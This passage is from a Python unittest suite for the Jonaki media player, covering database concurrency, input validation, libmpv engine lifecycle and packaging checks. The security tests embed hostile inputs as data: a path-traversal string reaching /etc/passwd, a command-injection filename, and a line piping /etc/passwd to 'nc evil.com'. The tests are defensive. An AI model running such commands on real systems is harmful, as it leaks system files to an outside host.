        # DEF-SEC-02 verified: MediaDatabase quarantines corrupted database and recovers cleanly
        db = MediaDatabase(corrupt_path)
        with db._get_connection() as conn:
            tables = {row["name"] for row in conn.execute("SELECT name FROM sqlite_master WHERE type='table'")}
            self.assertIn("playback_history", tables)

    def test_TC_DB_09_concurrent_multi_thread_access(self):
        """
        TC-DB-09: Verify thread safety and transaction concurrency with SQLite WAL mode.
        Preconditions: Database in WAL mode.
        Steps: Spawn 10 concurrent threads inserting resume points and bookmarks simultaneously.
        Expected: All 10 threads complete without sqlite3.OperationalError: database is locked.
        """
        errors = []

        def worker(idx):
            try:
                p = f"/media/file_{idx}.mp4"
                self.db.save_playback_position(p, position=float(idx * 10), duration=1000.0)
                self.db.add_bookmark(p, timestamp=float(idx * 5), title=f"BM {idx}")
                pos = self.db.get_playback_position(p)
                assert pos == float(idx * 10)
            except Exception as e:
                errors.append(e)

        threads = [threading.Thread(target=worker, args=(i,)) for i in range(10)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        self.assertEqual(errors, [], f"Concurrent DB access failed: {errors}")


# ==============================================================================
# Phase 2.H: Security, Input Validation & Subprocess Safety (TC-SEC-*)
# ==============================================================================

class TestSecurityAndInputValidation(unittest.TestCase):
    """
    Test suite for path traversal, command injection, and permission boundaries.
    """

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.shader_dir = os.path.join(self.temp_dir, "shaders")
        os.makedirs(self.shader_dir, exist_ok=True)
        # Create a valid dummy shader
        with open(os.path.join(self.shader_dir, "valid.hook"), "w") as f:
            f.write("// GLSL Shader")
        self.shader_mgr = VideoShaderManager(shaders_dir=self.shader_dir)

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_TC_SEC_01_shader_path_traversal_prevention(self):
        """
        TC-SEC-01: Verify path traversal in shader manager is blocked by basename sanitization.
        Preconditions: VideoShaderManager pointing to safe shaders directory.
        Steps: Attempt to enable shaders with traversal patterns (../../etc/passwd).
        Expected: Returns False, safe_name stays in shaders dir, arbitrary files not loaded.
        """
        self.assertFalse(self.shader_mgr.enable_shader("../../../../etc/passwd"))
        self.assertFalse(self.shader_mgr.enable_shader("/bin/sh"))
        self.assertEqual(len(self.shader_mgr.active_shaders), 0)

        # Valid shader should succeed
        self.assertTrue(self.shader_mgr.enable_shader("valid.hook"))
        self.assertEqual(len(self.shader_mgr.active_shaders), 1)

    def test_TC_SEC_02_shader_empty_string_defect(self):
        """
        TC-SEC-02: Verify fix for DEF-SEC-01: enable_shader('') rejects empty string.
        Preconditions: VideoShaderManager initialized.
        Steps: Call enable_shader("").
        Expected: Return False and reject empty string.
        """
        res = self.shader_mgr.enable_shader("")
        self.assertFalse(res, "DEF-SEC-01: enable_shader('') must return False")

    def test_TC_SEC_03_command_injection_prevention_in_libmpv_ffi(self):
        """
        TC-SEC-03: Verify command injection metacharacters in filenames do not execute shell commands.
        Preconditions: JonakiCore FFI initialized.
        Steps: Pass filename containing '; touch /tmp/pwned; ' or '$(reboot)'.
        Expected: mpv_command passes strings directly via C char* array, shell is never invoked.
        """
        core = JonakiCore()
        self.addCleanup(core.stop_engine)

        pwn_flag = "/tmp/jonaki_sec_test_pwned"
        if os.path.exists(pwn_flag):
            os.remove(pwn_flag)

        malicious_filename = f"/tmp/video.mp4; touch {pwn_flag};"
        core.load_file(malicious_filename)
        self.assertFalse(os.path.exists(pwn_flag), "Command injection executed via load_file!")

    def test_TC_SEC_04_capture_subprocess_shell_false(self):
        """
        TC-SEC-04: Verify MediaCaptureManager invokes FFmpeg without shell=True.
        Preconditions: MediaCaptureManager initialized.
        Steps: Pass malicious filename containing shell pipes and redirection.
        Expected: Handled as literal argument in argv list; shell is not used.
        """
        mgr = MediaCaptureManager(capture_dir=self.temp_dir)
        evil_input = "video.mp4; cat /etc/passwd | nc evil.com 1337;"
        # Subprocess will fail cleanly because evil_input does not exist on disk
        res = mgr.create_animated_gif(evil_input, start_sec=0.0)
        self.assertIsNone(res)

    def test_TC_SEC_05_clipboard_missing_utilities_fallback(self):
        """
        TC-SEC-05: Verify clipboard helper returns False gracefully when wl-copy and xclip are absent.
        Preconditions: Non-existent image or missing CLI tools.
        Steps: Call copy_file_to_clipboard on missing file or with patched PATH.
        Expected: Returns False cleanly without unhandled exception.
        """
        mgr = MediaCaptureManager(capture_dir=self.temp_dir)
        self.assertFalse(mgr.copy_file_to_clipboard("/nonexistent/image.png"))


# ==============================================================================
# Phase 2.E & 2.F: Reliability, Engine Lifecycle & Stress Testing (TC-REL-*)
# ==============================================================================

class TestReliabilityAndResourceManagement(unittest.TestCase):
    """
    Test suite for libmpv C-FFI lifecycle, stress seeking, rapid switching, and memory stability.
    """

    def test_TC_REL_01_engine_start_stop_restart_lifecycle(self):
        """
        TC-REL-01: Verify libmpv lifecycle: create, initialize, terminate, and restart.
        Preconditions: libmpv shared library available.
        Steps: Call start_engine(), verify handle, stop_engine(), restart_engine().
        Expected: Handle properly assigned, cleared on stop, re-allocated on restart.
        """
        core = JonakiCore()
        self.assertIsNotNone(core.handle)
        handle1 = core.handle

        core.stop_engine()
        self.assertIsNone(core.handle)
        self.assertEqual(core.state, PlaybackState.STOPPED)

        # Restart
        self.assertTrue(core.start_engine())
        self.assertIsNotNone(core.handle)
        core.stop_engine()

    def test_TC_REL_02_double_stop_engine_idempotence(self):
        """
        TC-REL-02: Verify multiple calls to stop_engine() are idempotent and safe.
        Preconditions: JonakiCore initialized.
        Steps: Call stop_engine() three consecutive times.
        Expected: No segmentation fault or double-free error.
        """
        core = JonakiCore()
        core.stop_engine()
        core.stop_engine()
        core.stop_engine()
        self.assertIsNone(core.handle)

    def test_TC_REL_03_no_orphaned_native_threads_on_stop(self):
        """
        TC-REL-03: Verify all native libmpv threads (demuxer, vo, audio) terminate on stop_engine.
        Preconditions: /proc/self/task readable.
        Steps: Count OS threads before start, during engine run, and after stop_engine.
        Expected: Thread count returns to baseline after mpv_terminate_destroy.
        """
        tasks_baseline = len(os.listdir("/proc/self/task/"))
        core = JonakiCore(wid=1)
        time.sleep(0.1)
        tasks_running = len(os.listdir("/proc/self/task/"))
        self.assertGreater(tasks_running, tasks_baseline)

        core.stop_engine()
        time.sleep(0.1)
        tasks_after = len(os.listdir("/proc/self/task/"))
        self.assertEqual(tasks_after, tasks_baseline)

    def test_TC_REL_04_rapid_file_switching_stress(self):
        """
        TC-REL-04: Verify rapid file switching (50 load_file calls in 100ms) without crash.
        Preconditions: JonakiCore initialized with dummy wid.
        Steps: Rapidly load 50 different file paths and query time tick.
        Expected: Engine processes commands without crashing or corrupting state.
        """
        core = JonakiCore(wid=1)
        self.addCleanup(core.stop_engine)

        dummy_file = os.path.join(tempfile.gettempdir(), "rapid_test.mkv")
        with open(dummy_file, "wb") as f:
            f.write(b"\x1a\x45\xdf\xa3" + b"\x00" * 512)

        try:
            for i in range(50):
                core.load_file(dummy_file, start_pts=float(i))
                core._query_time_tick()
        finally:
            if os.path.exists(dummy_file):
                os.remove(dummy_file)

    def test_TC_REL_05_high_frequency_seeking_stress(self):
        """
        TC-REL-05: Verify 100 high-frequency relative and absolute seeks do not deadlock.
        Preconditions: JonakiCore initialized.
        Steps: Execute rapid seek commands in alternating directions.
        Expected: All commands sent to mpv without deadlocks or buffer overflow.
        """
        core = JonakiCore(wid=1)
        self.addCleanup(core.stop_engine)

        for i in range(100):
            core.seek_relative(5.0 if i % 2 == 0 else -3.0)
            core.seek_absolute(float(i % 60))

    def test_TC_REL_06_memory_stability_over_playback_iterations(self):
        """
        TC-REL-06: Verify memory RSS remains stable over repeated playback operations.
        Preconditions: resource module available.
        Steps: Measure ru_maxrss before and after 100 engine operations.
        Expected: Memory growth is negligible (< 10MB).
        """
        import resource
        core = JonakiCore(wid=1)
        self.addCleanup(core.stop_engine)

        mem_start = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
        for i in range(100):
            core.set_volume(float(i % 100))
            core.set_speed(1.0 + (i % 4) * 0.25)
            core.set_property("mute", "yes" if i % 2 == 0 else "no")
            core._query_time_tick()

        mem_end = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
        delta_kb = mem_end - mem_start
        self.assertLess(delta_kb, 10240, f"Memory grew unexpectedly by {delta_kb} KB")

    def test_TC_REL_07_nonexistent_file_state_defect(self):
        """
        TC-REL-07: Confirm defect DEF-REL-01: Loading non-existent media leaves core in 'playing' state.
        Preconditions: JonakiCore initialized.
        Steps: Call load_file('/nonexistent/video.mp4') and invoke _query_time_tick().
        Expected (ideal): State transitions to STOPPED or IDLE when open fails.
        Actual: Engine remains in PlaybackState.PLAYING because idle-active is not checked.
        """
        core = JonakiCore(wid=1)
        self.addCleanup(core.stop_engine)

        core.load_file("/nonexistent/video_file_xyz123.mp4")
        time.sleep(0.1)
        core._query_time_tick()

        # DEF-REL-01 verified: Engine transitions to STOPPED when media fails to load
        self.assertEqual(core.state, PlaybackState.STOPPED,
                         "DEF-REL-01: Engine must transition to STOPPED on nonexistent media")


# ==============================================================================
# Phase 2.G: Desktop Integration & Packaging Verification (TC-PKG-*)
# ==============================================================================

class TestDesktopAndPackaging(unittest.TestCase):
    """
    Test suite for launcher binaries, environment exports, desktop entries, and install/uninstall scripts.
    """

    def setUp(self):
        self.root_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

    def test_TC_PKG_01_launchers_exist_and_executable(self):
        """
        TC-PKG-01: Verify bin/jonaki exists and has executable bit set.
        Preconditions: Repository checkout.
        Steps: Check os.access(path, os.X_OK) for bin/jonaki.
        Expected: File exists and is executable.
        """
        jonaki_bin = os.path.join(self.root_dir, "bin", "jonaki")

        self.assertTrue(os.path.isfile(jonaki_bin), "bin/jonaki missing")
        self.assertTrue(os.access(jonaki_bin, os.X_OK), "bin/jonaki is not executable")

    def test_TC_PKG_02_bin_jonaki_environment_exports(self):
        """
        TC-PKG-02: Verify bin/jonaki sets GDK_BACKEND=x11 and unsets WAYLAND_DISPLAY.
        Preconditions: bin/jonaki file present.
        Steps: Read content of bin/jonaki launcher script.
        Expected: Script explicitly configures GDK_BACKEND=x11 and unset WAYLAND_DISPLAY.
        """
        jonaki_bin = os.path.join(self.root_dir, "bin", "jonaki")
        with open(jonaki_bin, "r") as f:
            content = f.read()

        self.assertIn("export GDK_BACKEND=x11", content)
        self.assertIn("unset WAYLAND_DISPLAY", content)
        self.assertIn("PYTHONPATH=", content)
        self.assertIn("LD_LIBRARY_PATH=", content)

    def test_TC_PKG_03_desktop_entry_validation(self):
        """
        TC-PKG-03: Validate jonaki.desktop with desktop-file-validate.
        Preconditions: desktop-file-validate installed on host.
        Steps: Execute desktop-file-validate on jonaki.desktop.
        Expected: Command returns exit code 0 without validation errors.
        """
        for desktop_name in ("jonaki.desktop",):
            path = os.path.join(self.root_dir, desktop_name)
            self.assertTrue(os.path.isfile(path), f"{desktop_name} missing")
            res = subprocess.run(["desktop-file-validate", path], capture_output=True, text=True)
            self.assertEqual(res.returncode, 0, f"{desktop_name} validation error: {res.stderr}")

    def test_TC_PKG_04_application_icon_exists(self):
        """
        TC-PKG-04: Verify application icon assets exist at assets/logos/jonaki.png.
        Preconditions: Repository checkout.
        Steps: Inspect assets/logos/jonaki.png file size and format.
        Expected: File exists, non-empty, valid PNG header (b'\\x89PNG').
        """
        icon_path = os.path.join(self.root_dir, "assets", "logos", "jonaki.png")
        self.assertTrue(os.path.isfile(icon_path))
        with open(icon_path, "rb") as f:
            header = f.read(4)
        self.assertEqual(header, b"\x89PNG")

    def test_TC_PKG_05_installer_and_uninstaller_script_syntax(self):
        """
        TC-PKG-05: Verify bash syntax validity of install.sh and uninstall.sh.
        Preconditions: bash installed on host.
        Steps: Run bash -n install.sh and bash -n uninstall.sh.
        Expected: Both scripts pass syntax check (exit code 0).
        """
        for script_name in ("install.sh", "uninstall.sh"):
            script_path = os.path.join(self.root_dir, script_name)
            self.assertTrue(os.path.isfile(script_path))
            self.assertTrue(os.access(script_path, os.X_OK))
            res = subprocess.run(["bash", "-n", script_path], capture_output=True, text=True)
            self.assertEqual(res.returncode, 0, f"{script_name} bash syntax error: {res.stderr}")


if __name__ == "__main__":
    unittest.main()
